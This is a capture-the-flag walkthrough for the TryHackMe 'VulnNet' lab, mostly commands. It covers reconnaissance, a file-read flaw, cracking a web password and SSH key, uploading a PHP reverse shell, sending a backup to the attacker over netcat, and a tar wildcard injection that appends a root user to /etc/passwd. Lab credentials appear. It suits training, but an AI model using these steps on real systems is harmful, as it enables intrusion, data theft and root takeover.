# VulnNet

**Room Link:** [https://tryhackme.com/room/vulnnet1](https://tryhackme.com/room/vulnnet1)



## Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (664).png" alt=""><figcaption></figcaption></figure>



## Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (665).png" alt=""><figcaption></figcaption></figure>

## TCP/80 - HTTP

**Kali**

```
gobuster dir -u vulnnet.thm -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (667).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nikto -h vulnnet.thm
```

<figure><img src="../../.gitbook/assets/image (666).png" alt=""><figcaption></figcaption></figure>



Browsing gobuster we can see a subdomain, broadcast.vulnnet.thm

<figure><img src="../../.gitbook/assets/image (672).png" alt=""><figcaption></figcaption></figure>



## Fuzz Subdomain

We can see broadcast again when we scan for it.

**Kali**

```
gobuster vhost -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://vulnnet.thm  
```

<figure><img src="../../.gitbook/assets/image (671).png" alt=""><figcaption></figcaption></figure>







## **LFI**

One of the other js files shows we can use referer to look at files.

<figure><img src="../../.gitbook/assets/image (673).png" alt=""><figcaption></figcaption></figure>

Confirmed it works

**Kali**

```
curl -s http://vulnnet.thm/?referer=/etc/passwd 
```

<figure><img src="../../.gitbook/assets/image (669).png" alt=""><figcaption></figcaption></figure>



**Kali**

```
curl -s http://vulnnet.thm/?referer=/etc/passwd 
```



## &#x20;

<figure><img src="../../.gitbook/assets/image (674).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (676).png" alt=""><figcaption></figcaption></figure>



## Crack Hash

**Kali**

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

<figure><img src="../../.gitbook/assets/image (677).png" alt=""><figcaption></figcaption></figure>



```
Username: developers
Password: 9972761drmfsls
```

<figure><img src="../../.gitbook/assets/image (678).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (679).png" alt=""><figcaption></figcaption></figure>



## TCP/80 - HTTP

**Kali**

```
gobuster -U developers -P 9972761drmfsls dir -u broadcast.vulnnet.thm -w /usr/share/wordlists/SecLists/Discovery/Web-C
ontent/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (681).png" alt=""><figcaption></figcaption></figure>

## Initial Shell

**exploit:** [https://www.exploit-db.com/raw/44250](https://www.exploit-db.com/raw/44250)

**Kali**

```
nc -lvnp 1234
```

**Kali**

```
git clone https://github.com/pentestmonkey/php-reverse-shell.git
cd php-reverse-shell/
curl -F "file=@php-reverse-shell.php" -F "plupload=1" -F "name=php-reverse-shell.php" http://broadcast.vulnnet.thm/actions/photo_uploader.php -u developers:9972761drmfsls
```

<figure><img src="../../.gitbook/assets/image (682).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (683).png" alt=""><figcaption></figcaption></figure>



Get autocomplete

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```





## Lateral Movement&#x20;

**Victim**

```
cd /var/backups/
ls -lah
```

<figure><img src="../../.gitbook/assets/image (692).png" alt=""><figcaption></figcaption></figure>

### Netcat

**Kali(receiving)**

```
nc -l -p 1234 > ssh-backup.tar.gz
```

**Victim(sending)**

```
nc -w 3 $KALI 1234 < ssh-backup.tar.gz
```

**Kali**

```
tar xvf ssh-backup.tar.gz 
```

<figure><img src="../../.gitbook/assets/image (686).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
/opt/john/ssh2john.py id_rsa > id_john.txt
john --wordlist=/usr/share/wordlists/rockyou.txt id_john.txt
```

<figure><img src="../../.gitbook/assets/image (687).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
ssh -i id_rsa server-management@$VICTIM 
Password: oneTWO3gOyac
```

<figure><img src="../../.gitbook/assets/image (688).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

**exploit:** [https://gtfobins.github.io/gtfobins/tar/](https://gtfobins.github.io/gtfobins/tar/)

<figure><img src="../../.gitbook/assets/image (693).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
cd /var/opt/
cat backupsrv.sh
ls -lah backupsrv.sh
```

<figure><img src="../../.gitbook/assets/image (689).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
cat /etc/crontab
```

<figure><img src="../../.gitbook/assets/image (690).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
cd /home/server-management/Documents
rm -rf 'Employee Search Progress Report.pdf' 
rm -rf 'Daily Job Progress Report Format.pdf'
touch ./--checkpoint=1
touch './--checkpoint-action=exec=sh shell.sh'
vi shell.sh
```

**shell.sh**

```
#!/bin/bash

echo 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd
```

**Victim**

```
chmod +x shell.sh
```

Once the cronjob runs are new root user will be created.

**Victim**

```
su new
Password: 123
```

<figure><img src="../../.gitbook/assets/image (691).png" alt=""><figcaption></figcaption></figure>



















